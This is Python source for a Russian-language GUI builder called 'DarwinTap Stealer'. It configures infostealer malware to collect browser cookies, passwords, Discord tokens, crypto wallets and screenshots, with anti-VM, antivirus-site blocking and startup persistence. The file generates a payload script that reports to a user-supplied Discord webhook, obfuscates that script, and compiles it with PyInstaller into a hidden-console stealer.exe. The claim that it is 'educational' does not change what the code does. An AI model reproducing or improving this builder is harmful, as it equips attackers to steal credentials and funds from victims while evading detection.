import flet as ft
from flet import (
    Page, 
    Container, 
    Row, 
    Column, 
    Text, 
    IconButton, 
    Switch, 
    Slider, 
    ElevatedButton,
    Icon,
    Icons,
    ButtonStyle,
    RoundedRectangleBorder,
    colors,
    alignment,
    border_radius,
    margin,
    padding,
    Border,
    BorderSide,
    TextField,
)
import asyncio
import os
import subprocess
import time
from client import send_zip
from utils import block_sites
import builder as builder_module

def main(page: Page):
    # Основные цвета и стили
    bg_color = "#0d1924"  # Темно-синий фон
    sidebar_color = "#0d1924"  # Цвет боковой панели
    content_color = "#111f2c"  # Цвет основной области
    accent_color = "#3a8ff2"  # Голубой акцентный цвет
    text_color = "#ffffff"
    secondary_text_color = "#8c9eb0"
    divider_color = "#1e3040"

    page.bgcolor = bg_color
    page.title = "DarwinTap"
    page.window_width = 900
    page.window_height = 600
    page.window_min_width = 900
    page.window_min_height = 600
    page.theme_mode = ft.ThemeMode.DARK
    page.padding = 0
    
    # Переменные для разделов
    current_section = "stealer"
    
    # Фиктивные данные для программы
    status_text = Text("Готов к запуску сборки...", color=secondary_text_color, size=12)
    logs_text = Text("", color=secondary_text_color, size=12, selectable=True)
    
    # Переменные для полей ввода
    webhook_input = TextField(
        label="Discord Webhook URL",
        border_color=accent_color,
        color=text_color,
        bgcolor="#0a1520",
        label_style=ft.TextStyle(color=secondary_text_color),
        cursor_color=accent_color,
        text_size=14,
    )
    
    icon_path_input = TextField(
        label="Путь к иконке (опционально)",
        border_color=accent_color,
        color=text_color,
        bgcolor="#0a1520",
        label_style=ft.TextStyle(color=secondary_text_color),
        cursor_color=accent_color,
        text_size=14,
    )
    
    # Секция стилизованного заголовка
    header = Container(
        content=Row(
            controls=[
                # Лого и название
                Row(
                    controls=[
                        Container(
                            content=Text("🌌", size=20),
                            margin=margin.only(right=5)
                        ),
                        Text("DarwinTap", color=accent_color, weight="bold", size=16),
                    ],
                ),
                # Переключатель языка
                Row(
                    controls=[
                        Container(
                            content=Text("RUS", color=accent_color, weight="bold", size=14),
                            margin=margin.only(right=10)
                        ),
                        Container(
                            content=Text("ENG", color=secondary_text_color, size=14),
                        ),
                        # Режим темы
                        Container(
                            content=Icon(Icons.DARK_MODE, color=secondary_text_color, size=18),
                            margin=margin.only(left=20)
                        ),
                    ],
                    alignment=ft.MainAxisAlignment.END,
                ),
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
        ),
        padding=padding.only(left=20, right=20, top=15, bottom=15),
        border=Border(bottom=BorderSide(width=1, color=divider_color)),
    )
    
    # Функция обновления выбранного пункта меню
    def update_selected_menu(selected_text):
        nonlocal current_section
        current_section = selected_text.lower()
        
        for item in sidebar_controls:
            item_text = item.content.controls[1].value
            is_selected = item_text.lower() == current_section
            item.bgcolor = content_color if is_selected else None
            item.content.controls[1].color = accent_color if is_selected else text_color
            item.content.controls[1].weight = "bold" if is_selected else "normal"
        
        if current_section == "stealer":
            content.content.controls = [stealer_section]
        elif current_section == "builder":
            content.content.controls = [builder_section]
        elif current_section == "settings":
            content.content.controls = [settings_section]
        
        page.update()
    
    # Функция создания элемента бокового меню
    def create_sidebar_item(icon, text, selected=False):
        return Container(
            content=Row(
                controls=[
                    Text(icon, size=16),
                    Text(
                        text, 
                        color=accent_color if selected else text_color,
                        weight="bold" if selected else "normal",
                        size=14
                    )
                ],
                spacing=10,
            ),
            padding=padding.only(left=16, top=8, bottom=8, right=16),
            border_radius=border_radius.all(5),
            bgcolor=content_color if selected else None,
            on_click=lambda e: update_selected_menu(text)
        )
    
    # Создаем элементы бокового меню
    sidebar_items = [
        {"icon": "🔑", "text": "Stealer", "selected": True},
        {"icon": "🛠️", "text": "Builder", "selected": False},
        {"icon": "⚙️", "text": "Settings", "selected": False},
    ]
    
    # Создаем панель боковой навигации
    sidebar_controls = [create_sidebar_item(item["icon"], item["text"], item.get("selected", False)) for item in sidebar_items]
    
    # Боковая панель
    sidebar = Container(
        content=Column(
            controls=sidebar_controls,
            spacing=2,
            scroll=ft.ScrollMode.AUTO,
        ),
        width=180,
        bgcolor=sidebar_color,
        border=Border(right=BorderSide(width=1, color=divider_color)),
        padding=padding.only(top=10)
    )
    
    # Переключатели опций для Stealer
    cookies_switch = Switch(value=True, active_color=accent_color)
    passwords_switch = Switch(value=True, active_color=accent_color)
    discord_tokens_switch = Switch(value=True, active_color=accent_color)
    crypto_wallets_switch = Switch(value=True, active_color=accent_color)
    screenshot_switch = Switch(value=True, active_color=accent_color)
    zip_switch = Switch(value=True, active_color=accent_color)
    anti_vm_switch = Switch(value=True, active_color=accent_color)
    block_av_switch = Switch(value=False, active_color=accent_color)
    
    # Секция с настройками для Stealer
    stealer_section = Container(
        content=Column([
            Text("Stealer", color=text_color, size=16, weight="bold"),
            Container(height=10),
            
            Row([
                Text("Collect Browser Cookies", color=text_color, size=14),
                cookies_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Passwords", color=text_color, size=14),
                passwords_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Discord Tokens", color=text_color, size=14),
                discord_tokens_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Crypto Wallets", color=text_color, size=14),
                crypto_wallets_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Take Screenshot", color=text_color, size=14),
                screenshot_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Pack to ZIP Archive", color=text_color, size=14),
                zip_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Anti-VM", color=text_color, size=14),
                anti_vm_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Block AV Sites", color=text_color, size=14),
                block_av_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=10),
            
            Container(
                content=webhook_input,
                margin=margin.only(bottom=10),
            ),

            Container(height=10),
            
            Row([
                ElevatedButton(
                    content=Text("Начать сборку", size=14, weight="bold"),
                    style=ButtonStyle(
                        bgcolor=accent_color,
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: start_building(e),
                ),
                ElevatedButton(
                    content=Text("Сброс", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: reset_stealer_fields(),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
            
            Container(height=20),
            Text("Статус:", color=text_color, size=14, weight="bold"),
            status_text,
            Container(height=10),
            Text("Логи:", color=text_color, size=14, weight="bold"),
            Container(
                content=logs_text,
                bgcolor="#0a1520",
                border_radius=border_radius.all(5),
                padding=10,
                expand=True,
            ),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    # Секция Builder
    builder_section = Container(
        content=Column([
            Text("Builder", color=text_color, size=16, weight="bold"),
            Container(height=20),
            
            Text("Настройка выходного файла", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            # Поле для ввода Discord webhook URL
            Text("Discord Webhook URL (обязательно)", color=text_color, size=14),
            Container(
                content=webhook_input,
                margin=margin.only(top=5, bottom=15),
            ),
            
            # Поле для ввода пути к иконке
            Text("Путь к иконке", color=text_color, size=14),
            Container(
                content=icon_path_input,
                margin=margin.only(top=5, bottom=15),
            ),
            
            Text("Опции сборки", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            # Те же переключатели, что и в Stealer
            Row([
                Text("Collect Browser Cookies", color=text_color, size=14),
                cookies_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Passwords", color=text_color, size=14),
                passwords_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Discord Tokens", color=text_color, size=14),
                discord_tokens_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Crypto Wallets", color=text_color, size=14),
                crypto_wallets_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Take Screenshot", color=text_color, size=14),
                screenshot_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Pack to ZIP Archive", color=text_color, size=14),
                zip_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Anti-VM", color=text_color, size=14),
                anti_vm_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Block AV Sites", color=text_color, size=14),
                block_av_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            
            Row([
                ElevatedButton(
                    content=Text("Собрать билд", size=14, weight="bold"),
                    style=ButtonStyle(
                        bgcolor=accent_color,
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: start_building(e),
                ),
                ElevatedButton(
                    content=Text("Сброс настроек", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: reset_stealer_fields(),
                ),
                ElevatedButton(
                    content=Text("Проверить зависимости", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: check_dependencies(),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    # Секция Settings
    settings_section = Container(
        content=Column([
            Text("Settings", color=text_color, size=16, weight="bold"),
            Container(height=20),
            
            Text("Внешний вид", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Row([
                Text("Темная тема", color=text_color, size=14),
                Switch(value=True, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Язык интерфейса", color=text_color, size=14),
                ft.Dropdown(
                    options=[
                        ft.dropdown.Option("Русский"),
                        ft.dropdown.Option("English"),
                    ],
                    value="Русский",
                    width=150,
                    text_size=14,
                    color=text_color,
                    bgcolor="#0a1520",
                    border_color=accent_color,
                ),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            Text("Настройки приложения", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Row([
                Text("Проверять обновления", color=text_color, size=14),
                Switch(value=True, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Автоочистка логов", color=text_color, size=14),
                Switch(value=False, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            Text("О программе", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Container(
                content=Column([
                    Text("DarwinTap Stealer", color=text_color, size=14, weight="bold"),
                    Text("Версия: 1.0.0", color=secondary_text_color, size=12),
                    Text("Создано исключительно в образовательных целях", color=secondary_text_color, size=12),
                ]),
                padding=15,
                bgcolor="#0a1520",
                border_radius=border_radius.all(5),
            ),
            
            Container(height=20),
            
            Row([
                ElevatedButton(
                    content=Text("Проверить обновления", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                ),
                ElevatedButton(
                    content=Text("Сбросить настройки", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    def update_logs(message):
        current_time = time.strftime("%H:%M:%S")
        logs_text.value = f"{logs_text.value}[{current_time}] {message}\n"
        page.update()
    
    def update_status(message):
        status_text.value = message
        page.update()
    
    def reset_stealer_fields():
        # Сброс всех полей и переключателей к значениям по умолчанию
        cookies_switch.value = True
        passwords_switch.value = True
        discord_tokens_switch.value = True
        crypto_wallets_switch.value = True
        screenshot_switch.value = True
        zip_switch.value = True
        anti_vm_switch.value = True
        block_av_switch.value = False
        webhook_input.value = ""
        icon_path_input.value = ""
        logs_text.value = ""
        update_status("Готов к запуску сборки...")
        page.update()
    
    # Синхронная версия функции для запуска в отдельном потоке
    def simulate_building_sync():
        import threading
        import time
        import sys
        import shutil
        import tempfile
        import os
        
        def run():
            # Эмулируем асинхронную функцию в синхронном коде
            update_status("Начало процесса сборки...")
            update_logs("Инициализация процесса сборки")
            time.sleep(0.5)
            
            # Проверяем наличие webhook URL
            if not webhook_input.value:
                update_logs("Ошибка: не указан Discord Webhook URL")
                update_status("Ошибка: проверьте параметры")
                return
            
            update_logs("Проверка конфигурации...")
            time.sleep(0.5)
            
            # Собираем опции для билда
            options = {
                'collect_cookies': cookies_switch.value,
                'collect_passwords': passwords_switch.value,
                'collect_discord_tokens': discord_tokens_switch.value,
                'collect_crypto_wallets': crypto_wallets_switch.value,
                'take_screenshot': screenshot_switch.value,
                'pack_to_zip': zip_switch.value,
                'anti_vm': anti_vm_switch.value,
                'block_av_sites': block_av_switch.value,
                'add_to_startup': True
            }
            
            update_logs(f"Опции конфигурации: {', '.join([k for k, v in options.items() if v])}")
            
            # Проверка пути к иконке
            icon_path = None
            if icon_path_input.value:
                if os.path.exists(icon_path_input.value):
                    icon_path = icon_path_input.value
                    update_logs(f"Установлена пользовательская иконка: {icon_path}")
                else:
                    update_logs(f"Предупреждение: указанная иконка не найдена: {icon_path_input.value}")
            
            # Фиксим пути, чтобы избежать вложенности build_temp/build_temp/...
            current_dir = os.getcwd()
            build_dir = os.path.join(current_dir, "build_temp")
            
            # Создаем временную директорию для сборки
            try:
                # Удаляем если уже существует
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                os.makedirs(build_dir)
                
                update_logs(f"Создана директория для сборки: {build_dir}")
                
                # Создаем main.py файл с параметрами
                main_py_content = f"""
import os
import sys
import json
from client import main

# Webhook URL для отправки данных
WEBHOOK_URL = "{webhook_input.value}"

# Конфигурация стилера
OPTIONS = {options}

if __name__ == "__main__":
    main(WEBHOOK_URL)
"""
                
                # Записываем main.py файл с явным указанием кодировки
                main_py_path = os.path.join(build_dir, "main.py")
                with open(main_py_path, "w", encoding="utf-8") as f:
                    f.write(main_py_content)
                
                update_logs("Создан файл main.py")
                
                # Копируем необходимые модули в директорию сборки
                for module_file in ["client.py", "utils.py", "obfuscator.py"]:
                    if os.path.exists(module_file):
                        shutil.copy(module_file, build_dir)
                        update_logs(f"Скопирован модуль {module_file}")
                    else:
                        update_logs(f"Предупреждение: модуль {module_file} не найден")
                
                # Пробуем использовать обфускацию
                try:
                    # Пытаемся импортировать функции обфускации
                    obfuscate = None
                    basic_obfuscation = None
                    
                    try:
                        from obfuscator import obfuscate
                        update_logs("Импортирована функция полной обфускации")
                    except ImportError:
                        update_logs("Функция полной обфускации недоступна")
                    
                    try:
                        from obfuscator import basic_obfuscation
                        update_logs("Импортирована функция базовой обфускации")
                    except ImportError:
                        update_logs("Функция базовой обфускации недоступна")
                    
                    if not obfuscate and not basic_obfuscation:
                        update_logs("Внешние функции обфускации не найдены, будет использована встроенная обфускация")
                    
                    update_logs("Запуск обфускации...")
                    
                    # Обфускация кода
                    obfuscation_success = False
                    
                    # Метод 1: Полная обфускация через функцию obfuscate
                    if obfuscate:
                        try:
                            update_logs("Попытка полной обфускации (метод 1)...")
                            # Создаем безопасную копию исходного файла
                            backup_file = main_py_path + ".bak"
                            shutil.copy(main_py_path, backup_file)
                            
                            try:
                                # Вызываем функцию obfuscate, указывая входной и выходной файл
                                result_path = obfuscate(main_py_path, main_py_path)
                                
                                # Проверяем результат
                                if os.path.exists(main_py_path) and os.path.getsize(main_py_path) > 0:
                                    update_logs("Код успешно обфусцирован методом 1")
                                    obfuscation_success = True
                                else:
                                    update_logs("Метод 1: обфусцированный файл не создан или пуст")
                                    # Восстанавливаем из резервной копии
                                    shutil.copy(backup_file, main_py_path)
                            except Exception as e:
                                update_logs(f"Ошибка в методе 1: {str(e)}")
                                # Восстанавливаем из резервной копии
                                if os.path.exists(backup_file):
                                    shutil.copy(backup_file, main_py_path)
                            
                            # Удаляем резервную копию
                            if os.path.exists(backup_file):
                                os.remove(backup_file)
                        except Exception as full_ex:
                            update_logs(f"Ошибка при запуске метода 1: {str(full_ex)}")
                    
                    # Метод 2: Базовая обфускация через basic_obfuscation
                    if not obfuscation_success and basic_obfuscation:
                        try:
                            update_logs("Попытка базовой обфускации (метод 2)...")
                            # Читаем файл
                            with open(main_py_path, 'r', encoding='utf-8') as f:
                                code_content = f.read()
                            
                            # Применяем базовую обфускацию
                            obfuscated_code = basic_obfuscation(code_content)
                            
                            # Записываем обратно
                            with open(main_py_path, 'w', encoding='utf-8') as f:
                                f.write(obfuscated_code)
                            
                            update_logs("Код успешно обфусцирован методом 2 (базовая обфускация)")
                            obfuscation_success = True
                        except Exception as basic_ex:
                            update_logs(f"Ошибка в методе 2: {str(basic_ex)}")
                    
                    # Метод 3: Встроенная простая обфускация
                    if not obfuscation_success:
                        try:
                            update_logs("Попытка встроенной обфускации (метод 3)...")
                            
                            # Читаем файл
                            with open(main_py_path, 'r', encoding='utf-8') as f:
                                code_content = f.read()
                            
                            # Базовая встроенная обфускация - простая функция для переименования переменных
                            import random
                            import string
                            import re
                            
                            def generate_random_var():
                                """Генерирует случайное имя переменной"""
                                length = random.randint(5, 10)
                                first_char = random.choice(string.ascii_letters)
                                rest_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
                                return first_char + rest_chars
                            
                            # Заменяем некоторые стандартные имена переменных
                            var_to_obfuscate = ["data", "result", "response", "content", "file", "path", "config", "options", "params"]
                            for var in var_to_obfuscate:
                                new_var = generate_random_var()
                                pattern = r'\b' + re.escape(var) + r'\b'
                                code_content = re.sub(pattern, new_var, code_content)
                            
                            # Записываем обратно
                            with open(main_py_path, 'w', encoding='utf-8') as f:
                                f.write(code_content)
                            
                            update_logs("Код успешно обфусцирован методом 3 (встроенная обфускация)")
                            obfuscation_success = True
                        except Exception as simple_ex:
                            update_logs(f"Ошибка в методе 3: {str(simple_ex)}")
                    
                    # Если ни один из методов не сработал
                    if not obfuscation_success:
                        update_logs("Все методы обфускации не удались, продолжаем без обфускации")
                    
                except ImportError:
                    update_logs("Модули обфускации не найдены, продолжение без обфускации")
                except Exception as ex:
                    update_logs(f"Ошибка при обфускации: {str(ex)}")
                    update_logs("Продолжение без обфускации...")
                
                # Компиляция с PyInstaller
                try:
                    update_logs("Запуск PyInstaller...")
                    
                    # Формируем команду PyInstaller
                    pyinstaller_cmd = [
                        sys.executable, 
                        "-m", 
                        "PyInstaller", 
                        "--onefile", 
                        "--noconsole"
                    ]
                    
                    if icon_path:
                        pyinstaller_cmd.extend(["--icon", icon_path])
                    
                    # Добавляем просто имя файла, поскольку мы будем запускать из директории build_temp
                    pyinstaller_cmd.append("main.py")
                    
                    # Выводим команду для диагностики
                    update_logs(f"Команда: {' '.join(pyinstaller_cmd)}")
                    
                    # Запускаем PyInstaller как процесс
                    result = subprocess.run(
                        pyinstaller_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding="utf-8",
                        cwd=os.path.dirname(main_py_path)  # Запускаем в директории build_temp
                    )
                    
                    if result.returncode == 0:
                        update_logs("PyInstaller успешно выполнен")
                        
                        # Ищем созданный exe файл
                        dist_dir = os.path.join(build_dir, "dist")
                        if os.path.exists(dist_dir):
                            exe_files = [f for f in os.listdir(dist_dir) if f.endswith('.exe')]
                            
                            if exe_files:
                                exe_file = os.path.join(dist_dir, exe_files[0])
                                output_file = os.path.join(current_dir, "stealer.exe")
                                
                                # Копируем файл в корневую директорию
                                shutil.copy(exe_file, output_file)
                                update_logs(f"Сборка успешно завершена! Файл создан: {output_file}")
                                update_status("Сборка завершена успешно.")
                            else:
                                update_logs("Ошибка: исполняемый файл не найден в директории dist")
                                update_status("Ошибка сборки")
                        else:
                            update_logs(f"Ошибка: Директория {dist_dir} не найдена")
                            update_status("Ошибка сборки")
                    else:
                        update_logs(f"Ошибка PyInstaller, код возврата: {result.returncode}")
                        update_logs(f"Вывод: {result.stdout}")
                        update_logs(f"Ошибки: {result.stderr}")
                        update_status("Ошибка сборки")
                
                except Exception as ex:
                    update_logs(f"Ошибка при запуске PyInstaller: {str(ex)}")
                    update_status("Ошибка сборки")
                    
                # Очистка временных файлов
                try:
                    update_logs("Очистка временных файлов...")
                    # Оставляем build_temp на случай необходимости отладки
                except Exception as cleanup_ex:
                    update_logs(f"Предупреждение при очистке: {str(cleanup_ex)}")
            
            except Exception as ex:
                update_logs(f"Ошибка при подготовке сборки: {str(ex)}")
                update_status("Ошибка сборки")
        
        # Запускаем в отдельном потоке
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()

    def start_building(e):
        # Используем многопоточный подход вместо асинхронного
        # Это более надежный способ, работающий во всех версиях Flet
        simulate_building_sync()
    
    def check_dependencies():
        import threading
        
        def run():
            update_logs("Проверка необходимых зависимостей...")
            try:
                # Вызываем функцию проверки зависимостей из модуля builder
                if hasattr(builder_module, 'check_requirements'):
                    result = builder_module.check_requirements()
                    if result:
                        update_logs("Все необходимые зависимости установлены!")
                    else:
                        update_logs("Не все зависимости установлены. Запустите builder.py для установки.")
                else:
                    update_logs("Функция проверки зависимостей недоступна в модуле builder.")
            except Exception as e:
                update_logs(f"Ошибка при проверке зависимостей: {str(e)}")
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()

    # Основной контейнер с контентом
    content = Container(
        content=Column(
            [stealer_section],
            scroll=ft.ScrollMode.AUTO
        ),
        padding=20,
        expand=True,
    )
    
    # Основной макет
    page.add(
        header,
        Row(
            controls=[
                sidebar,
                content,
            ],
            expand=True,
            spacing=0,
        )
    )

ft.app(target=main) 